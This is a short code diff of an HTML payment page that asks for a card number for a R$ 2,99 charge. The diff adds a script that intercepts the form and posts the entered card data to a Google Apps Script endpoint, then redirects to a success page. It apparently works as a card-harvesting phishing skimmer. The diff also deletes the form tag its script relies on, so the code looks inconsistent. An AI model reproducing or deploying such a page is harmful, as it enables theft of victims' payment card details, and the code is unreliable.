@@ -128,8 +128,23 @@ button:active {
     <strong>R$ 2,99</strong>
   </div>
   
- <form action="https://script.google.com/macros/s/AKfycbxVzVA1B4_Sv_KQXCueeWe1w91iwePSyxQpbWtCb5_IotahOTaI3l1HvBQybUgTYeTo/exec">
-    
+ <script>
+document.getElementById("form").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  fetch("https://script.google.com/macros/s/AKfycbzxsR4BNGW745OmD8A62eNlCTQ8Eg6fPmAqBKdi0ecljT0v9R_td8mH-vbxUpeyhUm4/exec", {
+    method: "POST",
+    body: new FormData(this)
+  })
+  .then(() => {
+    window.location.href = "sucesso.html";
+  })
+  .catch(() => {
+    alert("Erro ao enviar. Tente novamente.");
+  });
+});
+</script>
+
     <label>Número do cartão</label>
     <input name="numero" required placeholder="Digite o número">
 
@@ -168,6 +183,7 @@ button:active {
 
 </body>
 </html>
+
 
 
 
